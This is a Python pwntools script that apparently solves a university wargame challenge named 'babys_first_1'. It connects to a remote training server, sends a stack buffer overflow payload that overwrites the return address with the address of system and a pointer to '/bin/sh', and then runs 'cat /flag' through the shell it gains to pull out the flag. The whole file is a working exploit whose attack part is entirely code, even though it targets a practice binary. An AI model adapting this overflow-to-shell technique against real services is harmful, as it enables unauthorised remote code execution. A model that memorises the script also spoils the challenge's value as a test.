#!/usr/bin/python

from pwn import *
import re

system = 0x8048526
command = 0x8048d74     # /bin/sh

#c = process("./babys_first_1")
c = remote("wargames.6447.sec.edu.au", 9001)
#gdb.attach(c)

c.sendline("1")
c.sendline("1")
c.sendline("1")
c.sendline("1")

payload = "a"*102
payload += p32(system)
payload += "a"*13
payload += p32(command)

log.info("Sending payload...")
c.sendline(payload)

c.sendline("3")
c.sendline("1")

time.sleep(1)

c.sendline("cat /flag")

reply = c.recvuntil('}')
flag = re.search("6447{(.*)}", reply).group(0)

log.success("Flag found: %s" %(flag))

c.close()
